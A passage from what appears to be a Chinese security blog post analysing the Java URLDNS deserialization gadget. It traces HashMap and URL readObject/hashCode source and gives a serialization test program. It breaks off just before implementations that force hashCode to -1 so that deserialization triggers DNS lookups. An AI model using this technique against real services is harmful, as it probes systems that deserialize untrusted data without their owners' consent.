+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">transient&lt;/span> Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> table;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Map.&lt;span style="color:#a6e22e">Entry&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> hash;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> K key;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> V value;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;&lt;/span> next;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Node(&lt;span style="color:#66d9ef">int&lt;/span> hash, K key, V value, Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;&lt;/span> next) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">hash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> hash;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> key;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> value;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">next&lt;/span> &lt;span style="color:#f92672">=&lt;/span> next;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> DEFAULT_INITIAL_CAPACITY &lt;span style="color:#f92672">=&lt;/span> 1 &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> 4;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以用如下图
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/urldns.zh-cn.assets/1.webp" />&lt;/p>
+&lt;p>HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(java.&lt;span style="color:#a6e22e">io&lt;/span>.&lt;span style="color:#a6e22e">ObjectInputStream&lt;/span> s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s.&lt;span style="color:#a6e22e">defaultReadObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reinitialize();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (loadFactor &lt;span style="color:#f92672">&amp;lt;=&lt;/span> 0 &lt;span style="color:#f92672">||&lt;/span> Float.&lt;span style="color:#a6e22e">isNaN&lt;/span>(loadFactor))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InvalidObjectException(&lt;span style="color:#e6db74">&amp;#34;Illegal load factor: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> loadFactor);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s.&lt;span style="color:#a6e22e">readInt&lt;/span>(); &lt;span style="color:#75715e">// Read and ignore number of buckets&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> mappings &lt;span style="color:#f92672">=&lt;/span> s.&lt;span style="color:#a6e22e">readInt&lt;/span>(); &lt;span style="color:#75715e">// Read number of mappings (size)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (mappings &lt;span style="color:#f92672">&amp;lt;&lt;/span> 0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InvalidObjectException(&lt;span style="color:#e6db74">&amp;#34;Illegal mappings count: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mappings);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mappings &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0) { &lt;span style="color:#75715e">// (if zero, use defaults)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Size the table using given load factor only if within&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// range of 0.25...4.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">float&lt;/span> lf &lt;span style="color:#f92672">=&lt;/span> Math.&lt;span style="color:#a6e22e">min&lt;/span>(Math.&lt;span style="color:#a6e22e">max&lt;/span>(0.&lt;span style="color:#a6e22e">25f&lt;/span>, loadFactor), 4.&lt;span style="color:#a6e22e">0f&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">float&lt;/span> fc &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">float&lt;/span>)mappings &lt;span style="color:#f92672">/&lt;/span> lf &lt;span style="color:#f92672">+&lt;/span> 1.&lt;span style="color:#a6e22e">0f&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> cap &lt;span style="color:#f92672">=&lt;/span> ((fc &lt;span style="color:#f92672">&amp;lt;&lt;/span> DEFAULT_INITIAL_CAPACITY) &lt;span style="color:#f92672">?&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DEFAULT_INITIAL_CAPACITY :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (fc &lt;span style="color:#f92672">&amp;gt;=&lt;/span> MAXIMUM_CAPACITY) &lt;span style="color:#f92672">?&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MAXIMUM_CAPACITY :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tableSizeFor((&lt;span style="color:#66d9ef">int&lt;/span>)fc));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">float&lt;/span> ft &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">float&lt;/span>)cap &lt;span style="color:#f92672">*&lt;/span> lf;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threshold &lt;span style="color:#f92672">=&lt;/span> ((cap &lt;span style="color:#f92672">&amp;lt;&lt;/span> MAXIMUM_CAPACITY &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ft &lt;span style="color:#f92672">&amp;lt;&lt;/span> MAXIMUM_CAPACITY) &lt;span style="color:#f92672">?&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">int&lt;/span>)ft : Integer.&lt;span style="color:#a6e22e">MAX_VALUE&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check Map.Entry[].class since it&amp;#39;s the nearest public type to&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// what we&amp;#39;re actually creating.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SharedSecrets.&lt;span style="color:#a6e22e">getJavaObjectInputStreamAccess&lt;/span>().&lt;span style="color:#a6e22e">checkArray&lt;/span>(s, Map.&lt;span style="color:#a6e22e">Entry&lt;/span>&lt;span style="color:#f92672">[]&lt;/span>.&lt;span style="color:#a6e22e">class&lt;/span>, cap);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>({&lt;span style="color:#e6db74">&amp;#34;rawtypes&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>})
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> tab &lt;span style="color:#f92672">=&lt;/span> (Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K,V&lt;span style="color:#f92672">&amp;gt;[]&lt;/span>)&lt;span style="color:#66d9ef">new&lt;/span> Node&lt;span style="color:#f92672">[&lt;/span>cap&lt;span style="color:#f92672">]&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> table &lt;span style="color:#f92672">=&lt;/span> tab;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> mappings; i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> K key &lt;span style="color:#f92672">=&lt;/span> (K) s.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> V value &lt;span style="color:#f92672">=&lt;/span> (V) s.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putVal(hash(key), key, value, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#66d9ef">false&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为&lt;code>hash(key)&lt;/code>，也就是会尝试调用key对应类的hashCode方法计算hash值。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">hash&lt;/span>(Object key) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> h;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (key &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> 0 : (h &lt;span style="color:#f92672">=&lt;/span> key.&lt;span style="color:#a6e22e">hashCode&lt;/span>()) &lt;span style="color:#f92672">^&lt;/span> (h &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> 16);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。&lt;/p>
+&lt;p>&lt;em>以上代码来源于JDK 12.0.1&lt;/em>&lt;/p>
+&lt;blockquote>
+&lt;p>
+&lt;a href="https://cloud.tencent.com/developer/article/1167574" target="_blank">https://cloud.tencent.com/developer/article/1167574&lt;/a>&lt;/p>
+&lt;p>
+&lt;a href="https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3" target="_blank">https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;strong>实际测试&lt;/strong>&lt;/p>
+&lt;p>使用如下代码进行测试&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">urltest&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello &amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL u &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#e6db74">&amp;#34;http://www.baidu.com/1&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL u1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#e6db74">&amp;#34;http://www.aliyun.com/1&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL,String&lt;span style="color:#f92672">&amp;gt;&lt;/span> map &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL,String&lt;span style="color:#f92672">&amp;gt;&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map.&lt;span style="color:#a6e22e">put&lt;/span>(u,&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map.&lt;span style="color:#a6e22e">put&lt;/span>(u1,&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileOutputStream fos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FileOutputStream(&lt;span style="color:#e6db74">&amp;#34;object&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectOutputStream os &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream(fos);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//writeObject()方法将myObj对象写入object文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os.&lt;span style="color:#a6e22e">writeObject&lt;/span>(map);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os.&lt;span style="color:#a6e22e">close&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//从文件中反序列化obj对象&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileInputStream fis &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FileInputStream(&lt;span style="color:#e6db74">&amp;#34;object&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream(fis);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//恢复对象&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap map2 &lt;span style="color:#f92672">=&lt;/span> (HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL,String&lt;span style="color:#f92672">&amp;gt;&lt;/span>)ois.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;finish&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ois.&lt;span style="color:#a6e22e">close&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> mappings; i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> K key &lt;span style="color:#f92672">=&lt;/span> (K) s.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> V value &lt;span style="color:#f92672">=&lt;/span> (V) s.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putVal(hash(key), key, value, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#66d9ef">false&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(java.&lt;span style="color:#a6e22e">io&lt;/span>.&lt;span style="color:#a6e22e">ObjectInputStream&lt;/span> s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GetField gf &lt;span style="color:#f92672">=&lt;/span> s.&lt;span style="color:#a6e22e">readFields&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String protocol &lt;span style="color:#f92672">=&lt;/span> (String)gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;protocol&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (getURLStreamHandler(protocol) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IOException(&lt;span style="color:#e6db74">&amp;#34;unknown protocol: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> protocol);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String host &lt;span style="color:#f92672">=&lt;/span> (String)gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;host&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> port &lt;span style="color:#f92672">=&lt;/span> gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;port&amp;#34;&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>1);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String authority &lt;span style="color:#f92672">=&lt;/span> (String)gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;authority&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String file &lt;span style="color:#f92672">=&lt;/span> (String)gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;file&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String ref &lt;span style="color:#f92672">=&lt;/span> (String)gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ref&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> hashCode &lt;span style="color:#f92672">=&lt;/span> gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hashCode&amp;#34;&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>1);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (authority &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ((host &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>host.&lt;span style="color:#a6e22e">isEmpty&lt;/span>()) &lt;span style="color:#f92672">||&lt;/span> port &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (host &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> authority &lt;span style="color:#f92672">=&lt;/span> (port &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) &lt;span style="color:#f92672">?&lt;/span> host : host &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> port;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tempState &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UrlDeserializedState(protocol, host, port, authority,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file, ref, hashCode);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> V &lt;span style="color:#a6e22e">put&lt;/span>(K key, V value) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> putVal(hash(key), key, value, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
+容易想到两种办法&lt;/p>
+&lt;ol>
+&lt;li>在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化&lt;/li>
+&lt;li>在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1
+以下是两种办法的实现，
